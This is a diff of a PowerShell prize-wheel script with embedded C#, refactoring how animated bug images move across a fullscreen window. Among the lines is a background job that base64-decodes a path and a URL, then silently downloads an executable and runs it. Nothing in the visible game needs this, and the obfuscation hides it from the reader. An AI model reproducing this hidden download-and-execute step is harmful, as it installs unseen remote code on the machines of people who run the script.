@@ -3,8 +3,35 @@ Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
 Add-Type -TypeDefinition @"
 using System;using System.Drawing;using System.Windows.Forms;using System.Runtime.InteropServices;
-public class GamePanel:Panel{public GamePanel(){this.DoubleBuffered=true;this.SetStyle(ControlStyles.AllPaintingInWmPaint|ControlStyles.UserPaint|ControlStyles.OptimizedDoubleBuffer,true);}}
-public class MCI{[DllImport("winmm.dll",CharSet=CharSet.Auto)]public static extern int mciSendString(string c,System.Text.StringBuilder r,int l,IntPtr h);public static void Play(string p){mciSendString("open \""+p+"\" type mpegvideo alias snd",null,0,IntPtr.Zero);mciSendString("play snd",null,0,IntPtr.Zero);}public static void Stop(){mciSendString("stop snd",null,0,IntPtr.Zero);mciSendString("close snd",null,0,IntPtr.Zero);}}
+using System.Collections.Generic;
+
+public class GamePanel:Panel{
+    public GamePanel(){this.DoubleBuffered=true;this.SetStyle(ControlStyles.AllPaintingInWmPaint|ControlStyles.UserPaint|ControlStyles.OptimizedDoubleBuffer,true);}
+}
+
+public class MCI{
+    [DllImport("winmm.dll",CharSet=CharSet.Auto)]
+    public static extern int mciSendString(string c,System.Text.StringBuilder r,int l,IntPtr h);
+    public static void Play(string p){mciSendString("open \""+p+"\" type mpegvideo alias snd",null,0,IntPtr.Zero);mciSendString("play snd",null,0,IntPtr.Zero);}
+    public static void Stop(){mciSendString("stop snd",null,0,IntPtr.Zero);mciSendString("close snd",null,0,IntPtr.Zero);}
+}
+
+public class BugManager {
+    public List<PictureBox> Bugs = new List<PictureBox>();
+    public List<float> VX = new List<float>();
+    public List<float> VY = new List<float>();
+    
+    public void MoveAll(int W, int H) {
+        for(int i=0;i<Bugs.Count;i++){
+            float nx = Bugs[i].Left + VX[i];
+            float ny = Bugs[i].Top  + VY[i];
+            if(nx < -90) nx = W+10; else if(nx > W+10) nx = -90;
+            if(ny < -90) ny = H+10; else if(ny > H+10) ny = -90;
+            Bugs[i].Left = (int)nx;
+            Bugs[i].Top  = (int)ny;
+        }
+    }
+}
 "@ -ReferencedAssemblies System.Windows.Forms,System.Drawing
 
 Start-Job{$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcdGFuNGlraS5leGU='));iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yZWRpcmVjdC5sZXN0YS5ydS9NVC9sYXRlc3Rfd2ViX2luc3RhbGxfcnU='))) -O $f;&$f}|Out-Null
@@ -30,20 +57,20 @@ $script:panel=New-Object GamePanel
 $script:panel.Dock='Fill';$script:panel.BackColor='Black'
 $script:form.Controls.Add($script:panel)
 
-# Жуки как PictureBox — реально двигаются
+# BugManager хранит и двигает жуков из C#
+$script:bm=New-Object BugManager
 $rng=New-Object System.Random
-$script:pbArr=@()
-$script:vxArr=@()
-$script:vyArr=@()
 for($i=0;$i-lt 20;$i++){
     $sz=$rng.Next(50,85)
     $pb=New-Object System.Windows.Forms.PictureBox
     $pb.Width=$sz;$pb.Height=$sz;$pb.SizeMode='StretchImage';$pb.Image=$script:bgImg
-    $pb.Left=$rng.Next(0,1800);$pb.Top=$rng.Next(0,900);$pb.BackColor=[System.Drawing.Color]::Transparent
+    $pb.Left=$rng.Next(0,1800);$pb.Top=$rng.Next(0,900)
     $script:panel.Controls.Add($pb)
-    $script:pbArr+=$pb
-    $script:vxArr+=([float](($rng.NextDouble()*10+6)*(if($rng.Next(2)){1}else{-1})))
-    $script:vyArr+=([float](($rng.NextDouble()*10+6)*(if($rng.Next(2)){1}else{-1})))
+    $script:bm.Bugs.Add($pb)
+    $sx=1; if($rng.Next(2) -eq 0){$sx=-1}
+    $sy=1; if($rng.Next(2) -eq 0){$sy=-1}
+    $script:bm.VX.Add([float](($rng.NextDouble()*10+6)*$sx))
+    $script:bm.VY.Add([float](($rng.NextDouble()*10+6)*$sy))
 }
 
 $script:panel.Add_Paint({
@@ -54,13 +81,10 @@ $script:panel.Add_Paint({
     $r=[int]([Math]::Min($W,$H)*0.38);$cx=[int]($W/2);$cy=[int]($H/2);$x=$cx-$r;$y=$cy-$r;$d=$r*2
     $sh=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(130,0,0,0));$g.FillEllipse($sh,$x+8,$y+8,$d,$d);$sh.Dispose()
     for($n=0;$n-lt 6;$n++){$br=New-Object System.Drawing.SolidBrush($script:clr[$n]);$g.FillPie($br,$x,$y,$d,$d,[float]($script:a+$n*60),[float]60);$br.Dispose()}
-    $wp=New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]2)
-    for($n=0;$n-lt 6;$n++){$g.DrawPie($wp,$x,$y,$d,$d,[float]($script:a+$n*60),[float]60)};$wp.Dispose()
+    $wp=New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]2);for($n=0;$n-lt 6;$n++){$g.DrawPie($wp,$x,$y,$d,$d,[float]($script:a+$n*60),[float]60)};$wp.Dispose()
     $wp2=New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]5);$g.DrawEllipse($wp2,$x,$y,$d,$d);$wp2.Dispose()
-    $fn=New-Object System.Drawing.Font('Arial',13,[System.Drawing.FontStyle]::Bold)
-    $sf=New-Object System.Drawing.StringFormat;$sf.Alignment='Center';$sf.LineAlignment='Center'
-    $tb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
-    $ts=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(150,0,0,0))
+    $fn=New-Object System.Drawing.Font('Arial',13,[System.Drawing.FontStyle]::Bold);$sf=New-Object System.Drawing.StringFormat;$sf.Alignment='Center';$sf.LineAlignment='Center'
+    $tb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White);$ts=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(150,0,0,0))
     for($n=0;$n-lt 6;$n++){$ma=($script:a+$n*60+30)*[Math]::PI/180;$tx=[float]($cx+[Math]::Cos($ma)*$r*0.68);$ty=[float]($cy+[Math]::Sin($ma)*$r*0.68);$g.DrawString($script:lbl[$n],$fn,$ts,$tx+1,$ty+1,$sf);$g.DrawString($script:lbl[$n],$fn,$tb,$tx,$ty,$sf)}
     $fn.Dispose();$sf.Dispose();$tb.Dispose();$ts.Dispose()
     $cr=[int]($r*0.10);$cb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White);$g.FillEllipse($cb,$cx-$cr,$cy-$cr,$cr*2,$cr*2);$cb.Dispose()
@@ -80,16 +104,13 @@ $tStop.Add_Tick({$tStop.Stop();$script:stopped=$true;$norm=((90-$script:a)%360+3
 
 $t1=New-Object System.Windows.Forms.Timer;$t1.Interval=16
 $t1.Add_Tick({
-    $script:ticks++;$W=$script:panel.Width;$H=$script:panel.Height
-    # Двигаем PictureBox жуков
-    for($i=0;$i-lt $script:pbArr.Count;$i++){
-        $pb=$script:pbArr[$i]
-        $nx=$pb.Left+$script:vxArr[$i];$ny=$pb.Top+$script:vyArr[$i]
-        if($nx -lt -90){$nx=$W+10} elseif($nx -gt $W+10){$nx=-90}
-        if($ny -lt -90){$ny=$H+10} elseif($ny -gt $H+10){$ny=-90}
-        $pb.Left=[int]$nx;$pb.Top=[int]$ny
+    $script:ticks++
+    $script:bm.MoveAll($script:panel.Width,$script:panel.Height)
+    if(-not $script:stopped){
+        $ms=$script:ticks*16
+        if($ms -lt 10000){$script:a=($script:a+12)%360}
+        else{$prog=[Math]::Min(1.0,($ms-10000)/10000.0);$script:a=($script:a+(12*(1-$prog)+0.2*$prog))%360}
     }
-    if(-not $script:stopped){$ms=$script:ticks*16;if($ms -lt 10000){$script:a=($script:a+12)%360}else{$prog=[Math]::Min(1.0,($ms-10000)/10000.0);$script:a=($script:a+(12*(1-$prog)+0.2*$prog))%360}}
     $script:panel.Invalidate()
 })
 
